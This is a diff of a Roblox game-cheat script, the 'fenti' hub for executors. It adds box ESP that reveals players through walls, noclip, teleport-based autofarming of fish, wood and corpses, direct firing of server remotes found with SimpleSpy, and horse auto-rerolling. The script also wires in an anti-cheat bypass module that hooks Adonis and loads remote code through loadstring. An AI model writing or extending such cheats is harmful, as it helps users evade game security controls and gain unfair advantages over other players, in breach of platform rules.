@@ -15,7 +15,7 @@
 --   [FENTI-06]   All shared state variables (+ Labels, caches)
 --   [FENTI-07]   Small utils (session time, refresh char, anti-AFK, no-stun)
 --   [FENTI-08]   Ban / fail logging (Adonis hooks in AC module)
---   [FENTI-09]   ESP (highlights, screen TextLabel, loops)
+--   [FENTI-09]   ESP (2D box + screen TextLabel, loops — no Highlight)
 --   [FENTI-10]   (removed) aimbot / silent aim
 --   [FENTI-11]   GetMousePos cleanup only
 --   [FENTI-12]   Combat (triggerbot, screen shake)
@@ -27,10 +27,10 @@
 --                  [FENTI-17·mash] _G.fentiGetMashingContainer IIFE
 --                  [FENTI-17a]     bobber / instaprompt IIFE
 --                  [FENTI-17b]     QTE auto-mash IIFE
---   [FENTI-18]   Chest / corpse / saints farm (_G.FentiFarm IIFE)
+--   [FENTI-18]   Corpse / saints farm (_G.FentiFarm IIFE) — chest TP autofarm removed
 --   [FENTI-20]   Webhook
 --   [FENTI-21]   Serverhop
---   [FENTI-22]   Obsidian UI + CreateLoading (sidebar changelog) → Information → Players → Fishing → … → Config
+--   [FENTI-22]   Obsidian UI + CreateLoading (sidebar changelog) → … Fishing → Autofarm → Teleport → … → Config
 --   [FENTI-23]   Post-UI startup notify
 --
 -- NOTE: Luau limits ~200 locals per function prototype — plain `do` still counts toward the main chunk; use (function() … end)().
@@ -204,18 +204,18 @@ do
                     return res.Body
                 end
             end
-            warn("[fenti] fentiHttpGet: no usable body for " .. url:sub(1, 100))
+            warn("http failed")
             return nil
         end
         g.fentiLoadstringRun = function(source, tag)
             tag = tostring(tag or "?")
             if type(source) ~= "string" or #source < 50 then
-                warn("[fenti] empty/short source for " .. tag .. " (len=" .. tostring(type(source) == "string" and #source or 0) .. ")")
+                warn("load failed")
                 return nil
             end
             local ls = fentiResolveCompiler()
             if type(ls) ~= "function" then
-                warn("[fenti] No loadstring/load — executor did not expose compiler APIs (cannot load " .. tag .. ").")
+                warn("load failed")
                 return nil
             end
             local chunkName = "fenti_" .. tag:gsub("[^%w_]", "_")
@@ -236,12 +236,12 @@ do
                 end
             end
             if type(chunk) ~= "function" then
-                warn("[fenti] compile failed " .. tag .. " got=" .. type(chunk) .. " err=" .. tostring(compileErr))
+                warn("load failed")
                 return nil
             end
             local ok, res = pcall(chunk)
             if not ok then
-                warn("[fenti] running chunk failed (" .. tag .. "): " .. tostring(res))
+                warn("load failed")
                 return nil
             end
             return res
@@ -274,7 +274,7 @@ do
     end
     _G.fentiAC = fentiAC
     if not fentiAC.loaded then
-        warn("[fenti] AC module required — " .. tostring(fentiAC.err))
+        warn("ac missing")
         return
     end
     pcall(function() fentiAC.api.earlyPass() end)
@@ -335,7 +335,6 @@ do
     
         local function klog(msg)
             local line = os.date("%Y-%m-%d %H:%M:%S") .. " [K-GATE] " .. tostring(msg):sub(1, 480)
-            warn("[fenti] " .. line)
             pcall(function()
                 if makefolder then makefolder("fail logs") end
                 if writefile then
@@ -546,7 +545,7 @@ do
     end
     
     if _G.fentiPotassiumAbort then
-        warn("[fenti] Potassium gate stopped the hub — see fail logs/fenti_potassium_gate.txt for ABORT_REASON lines.")
+        warn("stopped")
         return
     end
     
@@ -563,7 +562,7 @@ do
             if src then Library = _G.fentiLoadstringRun(src, "Obsidian.Library") end
         end)
         if not Library then
-            warn("[fenti] Obsidian Library did not load. If HttpGet is blocked, allow request() in your key script.")
+            warn("library missing")
             return
         end
     end
@@ -668,7 +667,7 @@ do
     local QTE = {}
     QTE.system = playerGui:FindFirstChild("MashingSystem") or playerGui:WaitForChild("MashingSystem", 5)
     QTE.container = QTE.system and (QTE.system:FindFirstChild("Container") or QTE.system:WaitForChild("Container", 5))
-    if not QTE.system or not QTE.container then warn("QTE System not found!") end
+    if not QTE.system or not QTE.container then warn("qte missing") end
     -- ----------------------------------------------------------------------------
     -- [FENTI-04a] Self aura (your models; Obsidian tab: Aura)
     -- ----------------------------------------------------------------------------
@@ -1377,7 +1376,7 @@ do
     local function apply_luffy_custom_avatar(character)
         local template = find_custom_avatar_template()
         if not template then
-            warn("[FENTI] Custom avatar aura: add a Model to ReplicatedStorage named FentiLuffyAvatar (or LuffyAvatar). Import luffyavatarmodel.rbxm in Roblox Studio, then copy the model into the game’s ReplicatedStorage in Explorer (or use a plugin). Scripts cannot read .rbxm from your PC.")
+            warn("aura missing")
             return
         end
         local hrp = character and character:FindFirstChild("HumanoidRootPart")
@@ -1404,7 +1403,7 @@ do
             end
         end
         if not (cloneRoot and cloneRoot:IsA("BasePart")) then
-            warn("[FENTI] Custom avatar model has no BasePart.")
+            warn("aura bad model")
             clone:Destroy()
             return
         end
@@ -1567,9 +1566,9 @@ do
     -- Caps how far we stretch prompts; 9999-style values often trip anti-cheat.
     local FENTI_PROMPT_MAX_STRETCH = 48
     -- Bump when you publish; optional _G.FENTI_VERSION_CHECK_URL compares remote return value to this (or _G.FENTI_EXPECTED_VERSION).
-    local FENTI_SCRIPT_VERSION = 7
+    local FENTI_SCRIPT_VERSION = 13
     -- One short line on Obsidian Loading sidebar (see [FENTI-22] CreateLoading).
-    local FENTI_HUB_CHANGELOG_BLURB = "Fish presets file · Saints corpse pickup · Hub polish"
+    local FENTI_HUB_CHANGELOG_BLURB = "Autofarm tab · unified chest/saints prompts · map TP · lumber/tree farm"
     local BEST_FISHING_SPOT = CFrame.new(-4883, 44.999, -2118)
     -- Built-in alternate spot (low ground / sussy coords from user).
     local FISHING_SPOT_SUSSY = CFrame.new(-6160.69091796875, 2.9873154163360596, -2545.29541015625)
@@ -1662,15 +1661,17 @@ do
     -- ----------------------------------------------------------------------------
     -- Fishing / economy
     local Script_Start_Time = os.time()
-    local isRunning, fishCaught, chestsOpened = false, 0, 0
+    local isRunning, fishCaught = false, 0
     local useBait, autoBuyBait, autoSellFish, autoBuyRod = true, false, false, false
-    local autoFishLootChests = false
+    local autoSellWood = false
+    -- Verbose fish loop logs (console + banLog). Default off — was disk+print every cast and caused periodic FPS hitches.
     if rawget(_G, "FENTI_FISH_DEBUG") == nil then _G.FENTI_FISH_DEBUG = false end
-    -- Chest / TP loop
-    local chestFarmEnabled, originalPosition, rootMotionLockConn, tpLoopConnection = false, nil, nil, nil
-    local openedChests, totalChestsAtStart = {}, 0
+    -- TP loop (fishing snap-back only; chest autofarm removed)
+    local originalPosition, rootMotionLockConn, tpLoopConnection = nil, nil, nil
+    local fentiNoclipConn = nil
+    local fentiNoclipEnabled = false
     -- Walk-up chests: background loop fires prompts when true (see proximity IIFE). Teleport tab can toggle off.
-    if rawget(_G, "AutoCollect") == nil then _G.AutoCollect = true end
+    if rawget(_G, "AutoCollect") == nil then _G.AutoCollect = false end
     _G.fentiFishingStanceMode = "spring"
     
     -- Fishing pose/rig helpers live in nested scope (saves main-chunk local register slots; Luau limit ~200).
@@ -1843,7 +1844,7 @@ do
     local VIM; pcall(function() VIM = game:GetService("VirtualInputManager") end)
     local Labels = {}
     local sendFishWebhook, serverHop, removeEntityESP, removePlayerESP
-    local ESPState = { PlayerCache = {}, EntityCache = {}, renderConn = nil, updateConn = nil, espSession = 0, worldConns = {}, screenGui = nil, _espNextClock = 0 }
+    local ESPState = { PlayerCache = {}, EntityCache = {}, renderConn = nil, updateConn = nil, espSession = 0, worldConns = {}, screenGui = nil }
     -- ----------------------------------------------------------------------------
     -- [FENTI-07] 7. CORE UTILITIES
     -- ----------------------------------------------------------------------------
@@ -1867,7 +1868,149 @@ do
     player.CharacterAdded:Connect(function(char)
         character = char
         humanoidRootPart = char:WaitForChild("HumanoidRootPart", 12) or char:FindFirstChild("HumanoidRootPart")
+        -- Fishing macro: return to saved stand after death / respawn (same spot as snap loop).
+        if isRunning then
+            task.defer(function()
+                task.wait(0.5)
+                if not isRunning then return end
+                local ret = rawget(_G, "fentiFishingReturnCFrame")
+                if typeof(ret) ~= "CFrame" then return end
+                refreshCharacter()
+                if not humanoidRootPart then return end
+                smartTeleport(ret)
+                pcall(function() Library:Notify("Fishing — back at your spot.", 2) end)
+            end)
+        end
     end)
+    
+    local function fentiSetNoclip(on)
+        fentiNoclipEnabled = (on == true)
+        if fentiNoclipConn then
+            pcall(function() fentiNoclipConn:Disconnect() end)
+            fentiNoclipConn = nil
+        end
+        if not fentiNoclipEnabled then return end
+        fentiNoclipConn = RunService.Stepped:Connect(function()
+            if not fentiNoclipEnabled then return end
+            local ch = player.Character
+            if not ch then return end
+            for _, p in ipairs(ch:GetDescendants()) do
+                if p:IsA("BasePart") then
+                    pcall(function() p.CanCollide = false end)
+                end
+            end
+        end)
+    end
+    _G.fentiSetNoclip = fentiSetNoclip
+
+    -- SimpleSpy: Remotes.UseTool:FireServer("LumberAxe", "Swing" / "Release") — lumber chop server-side.
+    local function fentiLumberAxeUseToolSwingRelease()
+        local Rm = RS:FindFirstChild("Remotes")
+        local ut = Rm and Rm:FindFirstChild("UseTool")
+        if not ut then return false end
+        pcall(function() ut:FireServer("LumberAxe", "Swing") end)
+        task.wait(0.075)
+        pcall(function() ut:FireServer("LumberAxe", "Release") end)
+        return true
+    end
+    _G.fentiLumberAxeUseToolSwingRelease = fentiLumberAxeUseToolSwingRelease
+
+    local function fentiWoodTotalHeld()
+        local n = 0
+        local function stackForWoodTool(t)
+            if not t or not t:IsA("Tool") or t.Name ~= "Wood" then return 0 end
+            local cand = t:FindFirstChild("Amount") or t:FindFirstChild("Stack") or t:FindFirstChild("Count") or t:FindFirstChild("Quantity")
+            if cand and (cand:IsA("IntValue") or cand:IsA("NumberValue")) then
+                return math.max(0, math.floor(cand.Value))
+            end
+            for _, d in ipairs(t:GetChildren()) do
+                if d:IsA("IntValue") or d:IsA("NumberValue") then
+                    local ln = string.lower(d.Name)
+                    if string.find(ln, "amount", 1, true) or string.find(ln, "stack", 1, true) or string.find(ln, "count", 1, true) then
+                        return math.max(0, math.floor(d.Value))
+                    end
+                end
+            end
+            return 1
+        end
+        local bp = player:FindFirstChild("Backpack")
+        local ch = player.Character
+        if ch then
+            for _, t in ipairs(ch:GetChildren()) do
+                if t:IsA("Tool") then n = n + stackForWoodTool(t) end
+            end
+        end
+        if bp then
+            for _, t in ipairs(bp:GetChildren()) do
+                if t:IsA("Tool") then n = n + stackForWoodTool(t) end
+            end
+        end
+        return n
+    end
+    _G.fentiWoodTotalHeld = fentiWoodTotalHeld
+
+    local function fentiGetExpTotal()
+        local ls = player:FindFirstChild("leaderstats")
+        if not ls then return nil end
+        local tryNames = { "XP", "Exp", "EXP", "Experience", "Experiance" }
+        for _, name in ipairs(tryNames) do
+            local v = ls:FindFirstChild(name)
+            if v and (v:IsA("IntValue") or v:IsA("NumberValue") or v:IsA("DoubleConstrainedValue")) then
+                return v.Value
+            end
+        end
+        for _, ch in ipairs(ls:GetChildren()) do
+            if ch:IsA("IntValue") or ch:IsA("NumberValue") or ch:IsA("DoubleConstrainedValue") then
+                local ln = string.lower(ch.Name)
+                if ln == "xp" or string.find(ln, "exp", 1, true) then
+                    return ch.Value
+                end
+            end
+        end
+        return nil
+    end
+    _G.fentiGetExpTotal = fentiGetExpTotal
+    
+    local function fentiApplyAfkOptimize()
+        pcall(function()
+            local L = game:GetService("Lighting")
+            L.GlobalShadows = false
+            L.FogEnd = 1e6
+            L.Brightness = math.clamp(L.Brightness * 0.92, 0.5, 6)
+            pcall(function() L.Technology = Enum.Technology.Compatibility end)
+            for _, c in ipairs(L:GetChildren()) do
+                if c:IsA("PostEffect") then pcall(function() c.Enabled = false end) end
+            end
+        end)
+        pcall(function()
+            local t = workspace:FindFirstChildOfClass("Terrain")
+            if t then
+                t.WaterWaveSize = 0
+                pcall(function() t.WaterReflectance = 0 end)
+            end
+        end)
+        pcall(function()
+            local ug = UserSettings():GetService("UserGameSettings")
+            if ug then
+                ug.MasterVolume = 0
+                pcall(function() ug.GraphicsQualityLevel = 1 end)
+            end
+        end)
+        pcall(function()
+            local s = settings()
+            if s and s.Rendering then s.Rendering.QualityLevel = Enum.QualityLevel.Level01 end
+        end)
+        task.defer(function()
+            pcall(function()
+                for _, d in ipairs(workspace:GetDescendants()) do
+                    if d:IsA("ParticleEmitter") or d:IsA("Trail") or d:IsA("Beam") or d:IsA("Fire") or d:IsA("Smoke") or d:IsA("Sparkles") then
+                        pcall(function() d.Enabled = false end)
+                    end
+                end
+            end)
+        end)
+    end
+    _G.fentiApplyAfkOptimize = fentiApplyAfkOptimize
     
     player.CharacterRemoving:Connect(function()
         pcall(function()
@@ -2103,6 +2246,37 @@ do
         if extra then table.insert(lines, tostring(extra)) end
         failLogWrite(table.concat(lines, "\n"))
     end
+    local function fentiBanLogConsoleLine(cat, text)
+        if rawget(_G, "FENTI_VERBOSE_CONSOLE") == true then
+            return nil
+        end
+        cat = tostring(cat or "")
+        text = tostring(text or "")
+        if cat == "INIT" then
+            return "okay"
+        elseif cat == "Bypass" or cat == "BYPASS" then
+            return "worked"
+        elseif cat == "TREE" then
+            return "tree cut"
+        elseif cat == "FISH" then
+            if string.find(text, "Catch confirmed", 1, true) or string.find(string.lower(text), "caught", 1, true) then
+                return "fish caught"
+            end
+            return "fish"
+        elseif cat == "TP" or cat == "TELEPORT" then
+            if string.find(text, "OK", 1, true) then
+                return "worked"
+            end
+            return "teleport issue"
+        elseif cat == "VERSION" then
+            return "version check"
+        elseif cat == "ERROR-GUI" then
+            return "gui issue"
+        elseif cat == "DEATH" then
+            return "died"
+        end
+        return "ok"
+    end
     local function banLog(category, msg)
         local cat = tostring(category or "")
         local text = tostring(msg or "")
@@ -2113,11 +2287,18 @@ do
         table.insert(_banLog, entry)
         _banLog_counts[cat] = (_banLog_counts[cat] or 0) + 1
         if #_banLog > 500 then table.remove(_banLog, 1) end
-        print("[fenti-log] " .. entry)
-        -- Disk read+write every log was freezing the client (especially FISH spam).
-        task.defer(function()
-            pcall(function() failLogWrite(entry) end)
-        end)
+        if rawget(_G, "FENTI_VERBOSE_CONSOLE") == true then
+            print("[fenti-log] " .. entry)
+        else
+            print(fentiBanLogConsoleLine(cat, text))
+        end
+        -- Disk read+write per line hitches the client (fish loop + Vault TP fire often).
+        local skipDisk = (cat == "FISH" or cat == "TP")
+        if not skipDisk then
+            task.defer(function()
+                pcall(function() failLogWrite(entry) end)
+            end)
+        end
     end
     _G.fentiACLog = function(_cat, _msg)
         banLog("Bypass", "success")
@@ -2149,7 +2330,7 @@ do
         end
         local compile = loadstring or load
         if type(compile) ~= "function" then
-            warn("[fenti] version check skipped — no loadstring/load")
+            warn("version skipped")
             return
         end
         local chunk, cerr = compile(body)
@@ -2168,7 +2349,7 @@ do
             if rawget(_G, "FENTI_VERSION_KICK") == true then
                 player:Kick(msg)
             else
-                warn("[fenti] " .. msg .. " Set _G.FENTI_VERSION_KICK=true before run to kick.")
+                warn("version outdated")
             end
         end
     end
@@ -2199,7 +2380,7 @@ do
             })
         end)
         if not okLate then
-            warn("[fenti] AC module lateInit failed — edit/host fenti_ac_bypass.lua")
+            warn("ac init failed")
         end
     end
     
@@ -2245,7 +2426,7 @@ do
     end)
     
     -- ----------------------------------------------------------------------------
-    -- [FENTI-09] 9. HIGHLIGHT + SCREEN-TEXT ESP (no BillboardGui)
+    -- [FENTI-09] 9. 2D BOX + SCREEN-TEXT ESP (no Highlight / no bold font)
     -- ----------------------------------------------------------------------------
     local VisualSettings = {
         Enabled = false,
@@ -2255,13 +2436,10 @@ do
         ShowDisplayName = true,
         ShowDistance = true,
         ShowWeapon = true,
-        ShowHighlightFill = true,
-        HighlightFill = 0.55,
-        HighlightOutline = 0.2,
+        ShowBox = true,
         PlayerColor = Color3.fromRGB(255, 50, 50),
         EntityEnabled = false,
         EntityColor = Color3.fromRGB(255, 255, 0),
-        ESPAlwaysOnTop = true,
     }
     
     local entities = workspace:FindFirstChild("Entities")
@@ -2271,7 +2449,7 @@ do
         local sg = Instance.new("ScreenGui")
         sg.Name = "fenti_ESP_Overlay"
         sg.ResetOnSpawn = false
-        sg.IgnoreGuiInset = false
+        sg.IgnoreGuiInset = true
         sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
         sg.DisplayOrder = 750
         sg.Enabled = true
@@ -2320,7 +2498,23 @@ do
         return toolName
     end
     
-    local function createESPGui(target, color, labelText, _showHP, _isEntity)
+    -- Fast 2D box from HRP (same idea as p100 esp — no GetBoundingBox / 8 corners per frame).
+    local function fentiESPHrpScreenRect(rootPart, cam)
+        if not rootPart or not cam then return nil end
+        local hrp2D, onScr = cam:WorldToViewportPoint(rootPart.Position)
+        if not onScr or hrp2D.Z <= 0 then return nil end
+        local bottom = cam:WorldToViewportPoint(rootPart.Position - Vector3.new(0, 1, 0))
+        local top = cam:WorldToViewportPoint(rootPart.Position + Vector3.new(0, 3, 0))
+        local charSize = math.abs(bottom.Y - top.Y) / 2
+        if charSize < 2 then charSize = 2 end
+        local w = math.max(4, math.floor(charSize * 1.5))
+        local h = math.max(6, math.floor(charSize * 3.2))
+        local minX = math.floor(hrp2D.X - charSize * 1.5 / 2)
+        local minY = math.floor(hrp2D.Y - charSize * 3 / 2)
+        return minX, minY, minX + w, minY + h
+    end
+    
+    local function createESPGui(target, color)
         if not target then return nil end
         if fentiESPIsLocalCharacterTarget(target) then return nil end
         local rootPart = target:FindFirstChild("HumanoidRootPart")
@@ -2331,33 +2525,33 @@ do
         textLbl.Name = "fenti_ESP_text"
         textLbl.BackgroundTransparency = 1
         textLbl.TextColor3 = color
-        textLbl.Text = labelText or target.Name
-        textLbl.TextSize = 15
-        textLbl.Font = Enum.Font.GothamBold
-        textLbl.TextStrokeTransparency = 0.45
-        textLbl.TextStrokeColor3 = Color3.new(0, 0, 0)
+        textLbl.Text = ""
+        textLbl.TextSize = 14
+        textLbl.Font = Enum.Font.Gotham
+        textLbl.TextStrokeTransparency = 1
         textLbl.TextXAlignment = Enum.TextXAlignment.Center
         textLbl.TextYAlignment = Enum.TextYAlignment.Bottom
         textLbl.AnchorPoint = Vector2.new(0.5, 1)
         textLbl.Visible = false
         pcall(function() textLbl.AutomaticSize = Enum.AutomaticSize.XY end)
         textLbl.Size = UDim2.fromOffset(2, 2)
-        textLbl.ZIndex = 5
+        textLbl.ZIndex = 6
         textLbl.Parent = sg
     
-        local hl = Instance.new("Highlight")
-        hl.Name = "fenti_ESP_HL"
-        hl.FillColor = color
-        hl.FillTransparency = VisualSettings.ShowHighlightFill and VisualSettings.HighlightFill or 1
-        hl.OutlineColor = color
-        hl.OutlineTransparency = VisualSettings.HighlightOutline
-        hl.Enabled = VisualSettings.ShowHighlightFill or VisualSettings.HighlightOutline < 0.99
-        hl.Parent = target
-        pcall(function()
-            if VisualSettings.ESPAlwaysOnTop then hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop end
-        end)
+        local boxFr = Instance.new("Frame")
+        boxFr.Name = "fenti_ESP_box"
+        boxFr.BackgroundTransparency = 1
+        boxFr.BorderSizePixel = 0
+        boxFr.Visible = false
+        boxFr.ZIndex = 5
+        boxFr.Parent = sg
+        local stroke = Instance.new("UIStroke")
+        stroke.Thickness = 1.25
+        stroke.Color = color
+        stroke.LineJoinMode = Enum.LineJoinMode.Miter
+        stroke.Parent = boxFr
     
-        return { TextLabel = textLbl, Highlight = hl }
+        return { TextLabel = textLbl, BoxFrame = boxFr, Stroke = stroke }
     end
     
     local function addPlayerESP(plr)
@@ -2367,10 +2561,7 @@ do
         if not char or not char:FindFirstChild("HumanoidRootPart") then return end
         local hum = char:FindFirstChildOfClass("Humanoid")
         if not hum or hum.Health <= 0 then return end
-        local disp = VisualSettings.ShowDisplayName and plr.DisplayName ~= "" and plr.DisplayName or plr.Name
-        local line = VisualSettings.ShowDisplayName and plr.DisplayName ~= plr.Name
-            and (disp .. "  @" .. plr.Name) or disp
-        local objs = createESPGui(char, VisualSettings.PlayerColor, line, VisualSettings.ShowHP, false)
+        local objs = createESPGui(char, VisualSettings.PlayerColor)
         if objs then
             ESPState.PlayerCache[plr] = { Character = char, Objects = objs }
         end
@@ -2380,7 +2571,7 @@ do
         local data = ESPState.PlayerCache[plr]
         if data then
             pcall(function() if data.Objects.TextLabel then data.Objects.TextLabel:Destroy() end end)
-            pcall(function() if data.Objects.Highlight then data.Objects.Highlight:Destroy() end end)
+            pcall(function() if data.Objects.BoxFrame then data.Objects.BoxFrame:Destroy() end end)
             ESPState.PlayerCache[plr] = nil
         end
     end
@@ -2393,7 +2584,7 @@ do
         removeEntityESP(ent)
         local hum = ent:FindFirstChildOfClass("Humanoid")
         if not hum or hum.Health <= 0 then return end
-        local objs = createESPGui(ent, VisualSettings.EntityColor, ent.Name, true, true)
+        local objs = createESPGui(ent, VisualSettings.EntityColor)
         if objs then
             ESPState.EntityCache[ent] = {Objects = objs}
         end
@@ -2403,7 +2594,7 @@ do
         local data = ESPState.EntityCache[ent]
         if data then
             pcall(function() if data.Objects.TextLabel then data.Objects.TextLabel:Destroy() end end)
-            pcall(function() if data.Objects.Highlight then data.Objects.Highlight:Destroy() end end)
+            pcall(function() if data.Objects.BoxFrame then data.Objects.BoxFrame:Destroy() end end)
             ESPState.EntityCache[ent] = nil
         end
     end
@@ -2418,12 +2609,14 @@ do
                 pcall(function()
                     local o = data.Objects
                     if o and o.TextLabel then o.TextLabel.Visible = false end
+                    if o and o.BoxFrame then o.BoxFrame.Visible = false end
                 end)
             end
             for _, data in pairs(ESPState.EntityCache) do
                 pcall(function()
                     local o = data.Objects
                     if o and o.TextLabel then o.TextLabel.Visible = false end
+                    if o and o.BoxFrame then o.BoxFrame.Visible = false end
                 end)
             end
             return
@@ -2440,7 +2633,8 @@ do
                 local char = data.Character
                 local objs = data.Objects
                 local lbl = objs and objs.TextLabel
-                local hl = objs and objs.Highlight
+                local boxFr = objs and objs.BoxFrame
+                local stroke = objs and objs.Stroke
                 if not char or not char.Parent or not char:FindFirstChild("HumanoidRootPart") then
                     removePlayerESP(plr); return
                 end
@@ -2452,18 +2646,32 @@ do
                 local dSq = dOff:Dot(dOff)
                 if dSq > maxDsq then
                     if lbl then lbl.Visible = false end
-                    if hl then hl.Enabled = false end
+                    if boxFr then boxFr.Visible = false end
                     return
                 end
                 local dist = math.floor(math.sqrt(dSq))
-                if hl then
-                    hl.Enabled = true
-                    hl.FillTransparency = VisualSettings.ShowHighlightFill and VisualSettings.HighlightFill or 1
+                local minX, minY, maxX, maxY
+                if VisualSettings.ShowBox then
+                    minX, minY, maxX, maxY = fentiESPHrpScreenRect(root, cam)
                 end
-    
-                local worldPt = root.Position + Vector3.new(0, 3, 0)
-                local sp, onScreen = cam:WorldToViewportPoint(worldPt)
-                local okVis = onScreen and sp.Z > 0
+                local spX, spY, okVis
+                if minX and boxFr then
+                    local w = math.max(3, maxX - minX)
+                    local h = math.max(3, maxY - minY)
+                    boxFr.Size = UDim2.fromOffset(w, h)
+                    boxFr.Position = UDim2.fromOffset(minX, minY)
+                    if stroke then stroke.Color = VisualSettings.PlayerColor end
+                    boxFr.Visible = true
+                    spX = (minX + maxX) * 0.5
+                    spY = minY
+                    okVis = true
+                else
+                    if boxFr then boxFr.Visible = false end
+                    local worldPt = root.Position + Vector3.new(0, 3, 0)
+                    local sp, onScreen = cam:WorldToViewportPoint(worldPt)
+                    okVis = onScreen and sp.Z > 0
+                    spX, spY = sp.X, sp.Y
+                end
     
                 local lines = {}
                 if VisualSettings.ShowName then
@@ -2474,7 +2682,7 @@ do
                         table.insert(lines, plr.Name)
                     end
                 end
-                if VisualSettings.ShowDistance then table.insert(lines, dist .. "m") end
+                if VisualSettings.ShowDistance then table.insert(lines, tostring(dist) .. " studs") end
                 if VisualSettings.ShowHP then
                     table.insert(lines, string.format("%.0f / %.0f HP", hum.Health, hum.MaxHealth))
                 end
@@ -2486,7 +2694,7 @@ do
                     lbl.TextColor3 = VisualSettings.PlayerColor
                     lbl.Text = table.concat(lines, "\n")
                     lbl.Visible = okVis and #lines > 0
-                    if lbl.Visible then lbl.Position = UDim2.fromOffset(sp.X, sp.Y - 6) end
+                    if lbl.Visible then lbl.Position = UDim2.fromOffset(spX, spY - 4) end
                 end
             end)
             end
@@ -2499,7 +2707,8 @@ do
             pcall(function()
                 local objs = data.Objects
                 local lbl = objs and objs.TextLabel
-                local hl = objs and objs.Highlight
+                local boxFr = objs and objs.BoxFrame
+                local stroke = objs and objs.Stroke
                 if not ent or not ent.Parent or not ent:FindFirstChild("HumanoidRootPart") then
                     removeEntityESP(ent); return
                 end
@@ -2511,18 +2720,32 @@ do
                 local dSq = dOff2:Dot(dOff2)
                 if dSq > maxDsq then
                     if lbl then lbl.Visible = false end
-                    if hl then hl.Enabled = false end
+                    if boxFr then boxFr.Visible = false end
                     return
                 end
                 local dist = math.floor(math.sqrt(dSq))
-                if hl then
-                    hl.Enabled = true
-                    hl.FillTransparency = VisualSettings.ShowHighlightFill and VisualSettings.HighlightFill or 1
+                local minX, minY, maxX, maxY
+                if VisualSettings.ShowBox then
+                    minX, minY, maxX, maxY = fentiESPHrpScreenRect(root, cam)
                 end
-    
-                local worldPt = root.Position + Vector3.new(0, 3, 0)
-                local sp, onScreen = cam:WorldToViewportPoint(worldPt)
-                local okVis = onScreen and sp.Z > 0
+                local spX, spY, okVis
+                if minX and boxFr then
+                    local w = math.max(3, maxX - minX)
+                    local h = math.max(3, maxY - minY)
+                    boxFr.Size = UDim2.fromOffset(w, h)
+                    boxFr.Position = UDim2.fromOffset(minX, minY)
+                    if stroke then stroke.Color = VisualSettings.EntityColor end
+                    boxFr.Visible = true
+                    spX = (minX + maxX) * 0.5
+                    spY = minY
+                    okVis = true
+                else
+                    if boxFr then boxFr.Visible = false end
+                    local worldPt = root.Position + Vector3.new(0, 3, 0)
+                    local sp, onScreen = cam:WorldToViewportPoint(worldPt)
+                    okVis = onScreen and sp.Z > 0
+                    spX, spY = sp.X, sp.Y
+                end
     
                 local lines = {}
                 if VisualSettings.ShowName then table.insert(lines, ent.Name) end
@@ -2530,7 +2753,7 @@ do
                     local holdName = fentiESPGetCharacterHoldingName(ent)
                     if holdName then table.insert(lines, "Holding: " .. holdName) end
                 end
-                if VisualSettings.ShowDistance then table.insert(lines, dist .. "m") end
+                if VisualSettings.ShowDistance then table.insert(lines, tostring(dist) .. " studs") end
                 if VisualSettings.ShowHP then
                     table.insert(lines, string.format("%.0f / %.0f HP", hum.Health, hum.MaxHealth))
                 end
@@ -2538,7 +2761,7 @@ do
                     lbl.TextColor3 = VisualSettings.EntityColor
                     lbl.Text = table.concat(lines, "\n")
                     lbl.Visible = okVis and #lines > 0
-                    if lbl.Visible then lbl.Position = UDim2.fromOffset(sp.X, sp.Y - 6) end
+                    if lbl.Visible then lbl.Position = UDim2.fromOffset(spX, spY - 4) end
                 end
             end)
             end
@@ -2583,12 +2806,8 @@ do
         end
     
         if ESPState.updateConn then ESPState.updateConn:Disconnect() end
-        ESPState._espNextClock = 0
-        ESPState.updateConn = RunService.Heartbeat:Connect(function()
+        ESPState.updateConn = RunService.RenderStepped:Connect(function()
             if not espEnabled or not VisualSettings.Enabled then return end
-            local now = os.clock()
-            if now < ESPState._espNextClock then return end
-            ESPState._espNextClock = now + 0.1
             pcall(updateESPLoop)
         end)
     
@@ -2609,7 +2828,7 @@ do
             local data = ESPState.PlayerCache[plr]
             if data then
                 pcall(function() if data.Objects.TextLabel then data.Objects.TextLabel:Destroy() end end)
-                pcall(function() if data.Objects.Highlight then data.Objects.Highlight:Destroy() end end)
+                pcall(function() if data.Objects.BoxFrame then data.Objects.BoxFrame:Destroy() end end)
             end
         end
         table.clear(ESPState.PlayerCache)
@@ -2617,7 +2836,7 @@ do
             local data = ESPState.EntityCache[ent]
             if data then
                 pcall(function() if data.Objects.TextLabel then data.Objects.TextLabel:Destroy() end end)
-                pcall(function() if data.Objects.Highlight then data.Objects.Highlight:Destroy() end end)
+                pcall(function() if data.Objects.BoxFrame then data.Objects.BoxFrame:Destroy() end end)
             end
         end
         table.clear(ESPState.EntityCache)
@@ -2938,11 +3157,246 @@ do
     
     local function buyHorse()
         if not DialogueRemote then Library:Notify("DialogueRemote not found!", 3); return end
-        pcall(function() DialogueRemote:FireServer("Action", "Buy_Horse") end)
-        task.wait(0.3)
-        pcall(function() DialogueRemote:FireServer("Buy_Horse") end)
+        local npcFolder = workspace:FindFirstChild("NPC")
+        local seller = nil
+        if npcFolder then
+            for _, ch in ipairs(npcFolder:GetChildren()) do
+                if ch:IsA("Model") then
+                    local ln = string.lower(ch.Name)
+                    if string.find(ln, "bridger", 1, true) or string.find(ln, "jim", 1, true) or string.find(ln, "horse", 1, true) then
+                        seller = ch
+                        break
+                    end
+                end
+            end
+        end
+        if seller then
+            pcall(function() DialogueRemote:FireServer("Talk", seller.Name, seller) end)
+            pcall(function() DialogueRemote:FireServer("Open", nil, seller, 15, "Start") end)
+            task.wait(0.08)
+            pcall(function() DialogueRemote:FireServer(unpack({ "Action", "Buy_Horse", seller })) end)
+        else
+            pcall(function() DialogueRemote:FireServer("Action", "Buy_Horse") end)
+            pcall(function() DialogueRemote:FireServer("Buy_Horse") end)
+        end
         Library:Notify("Buy horse request sent!", 3)
     end
+    
+    -- Horse auto-reroll (mythical) — from SimpleScript build; needs _G.fentiDialogue.clickChoiceByText after dialogue IIFE loads.
+    ;(function()
+        local horseRolling = false
+        local horseRollCount = 0
+        local function getDialogueBodyText()
+            local pg = player:FindFirstChild("PlayerGui")
+            if not pg then return "" end
+            local gui = pg:FindFirstChild("DialogueGui") or pg:FindFirstChild("DialogGUI")
+            if not gui then gui = pg:FindFirstChild("DialogueGui", true) end
+            if not gui or not gui:IsA("LayerCollector") or not gui.Enabled then return "" end
+            local allText = ""
+            pcall(function()
+                for _, desc in ipairs(gui:GetDescendants()) do
+                    if desc:IsA("TextLabel") and desc.Visible and desc.Text and #desc.Text > 5 then
+                        allText = allText .. " " .. desc.Text
+                    end
